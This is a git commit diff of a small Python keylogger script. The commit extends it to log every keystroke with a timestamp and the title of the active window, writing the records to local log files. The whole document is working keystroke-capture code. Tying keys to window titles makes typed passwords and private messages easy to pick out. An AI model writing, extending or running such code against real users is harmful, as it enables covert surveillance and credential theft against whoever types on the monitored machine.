a884457389b7b3b0f68939b1993e73d6437be910
Ben Eli <benelashvili@gmail.com>
2023-01-13 00:00:02 +0200

    added time to each keystroke + the active window that is open at the time

--- main.py
+++ main.py
@@ -1,24 +1,31 @@
-# This is a sample Python script.
-
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
-from pynput import keyboard
-from datetime import datetime
 import os
 
+import win32gui
+from pynput import keyboard
+from datetime import datetime
 
-
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
+
+    # open logs dir if doesn't exist, each log with the time that you ran the program.
     current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
+    log_file = "log " + current_time + ".txt"
     log_dir = "logs/"
     if not os.path.exists(log_dir):
         os.makedirs(log_dir)
-    log_file =log_dir+"log " + current_time + ".txt"
+    log_file = log_dir + "log " + current_time + ".txt"
+
+
+    # get the window that the user is on while pressing on keys
+    def get_active_window_title():
+        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+
+    # on every press put it in the logs with time,window title name and key value.
     def on_press(key):
+        title = get_active_window_title()
+        current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
         with open(log_file, "a") as f:
-            f.write(str(key) + "\n")
+            f.write("[{}] [{}] {}\n".format(current_time, title, key))
 
 
     def on_release(key):
@@ -27,4 +34,3 @@ if __name__ == '__main__':
 
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
